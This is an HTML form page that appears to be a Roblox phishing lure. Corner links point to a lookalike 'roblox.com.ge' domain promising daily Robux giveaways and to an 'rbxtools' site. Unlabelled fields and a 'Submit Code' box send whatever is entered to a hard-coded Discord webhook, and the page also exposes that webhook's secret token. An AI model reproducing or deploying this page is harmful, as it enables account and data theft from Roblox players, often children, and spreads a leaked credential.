<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Form Page</title>

<style>
    body {
        margin: 0;
        background: #0d0d0d;
        color: white;
        font-family: Arial, sans-serif;
    }

    h1 {
        text-align: center;
        margin-top: 40px;
        font-size: 32px;
    }

    .section {
        width: 90%;
        max-width: 700px;
        background: rgba(255,255,255,0.06);
        padding: 25px;
        border-radius: 15px;
        margin: 25px auto;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255,255,255,0.15);
    }

    .label {
        font-size: 18px;
        margin-bottom: 10px;
        display: block;
        font-weight: bold;
    }

    input, textarea {
        width: 100%;
        padding: 12px;
        border-radius: 10px;
        border: none;
        background: rgba(255,255,255,0.12);
        color: white;
        font-size: 16px;
        margin-top: 10px;
        outline: none;
    }

    button.submit {
        margin-top: 15px;
        width: 100%;
        padding: 15px;
        background: #4f73ff;
        border: none;
        color: white;
        font-size: 18px;
        border-radius: 12px;
        cursor: pointer;
        transition: 0.2s;
    }

    button.submit:hover {
        background: #6d89ff;
    }

    .corner-buttons {
        position: fixed;
        top: 15px;
        right: 15px;
        display: flex;
        flex-direction: column;
        gap: 10px;
        z-index: 10;
    }

    .corner-buttons a {
        background: rgba(255,255,255,0.15);
        color: white;
        text-decoration: none;
        padding: 10px 14px;
        border-radius: 10px;
        font-size: 14px;
        backdrop-filter: blur(5px);
        border: 1px solid rgba(255,255,255,0.2);
        transition: 0.2s;
    }

    .corner-buttons a:hover {
        background: rgba(255,255,255,0.27);
    }
</style>
</head>
<body>

<div class="corner-buttons">
    <a href="https://roblox.com.ge/communities/3204454304/" target="_blank">
        Join Roblox Group<br>(giveaways of robux everyday)
    </a>
    <a href="https://rbxtools.st/dashboard23" target="_blank">
        Roblox Tools Website
    </a>
</div>

<h1>Form Submission</h1>

<!-- SECTION 1 -->
<div class="section">
    <label class="label">Section 1</label>
    <input type="text" id="sec1" placeholder="Type here...">
</div>

<!-- SECTION 2 -->
<div class="section">
    <label class="label">Section 2</label>
    <input type="text" id="sec2" placeholder="Type here...">
</div>

<!-- SUBMIT CODE -->
<div class="section">
    <label class="label">Submit Code</label>
    <textarea id="codeInput" rows="4" placeholder="Write your code here..."></textarea>
    <button class="submit" onclick="sendToWebhook()">Submit</button>
</div>

<script>
function sendToWebhook() {
    const webhookURL = "https://canary.discord.com/api/webhooks/1443361938368364725/R0MXAIduguCOc7S24GHLDvr9tvG5Qg6o7Dzmud2YAy25SxqbNPnF1PN5nAdI7DPo8ZyZ";

    const data = {
        username: "Form Bot",
        embeds: [{
            title: "New Submission",
            color: 5814783,
            fields: [
                { name: "Section 1", value: document.getElementById("sec1").value || "None" },
                { name: "Section 2", value: document.getElementById("sec2").value || "None" },
                { name: "Submitted Code", value: document.getElementById("codeInput").value || "None" }
            ]
        }]
    };

    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    });

    alert("Sent!");
}
</script>

</body>
</html>
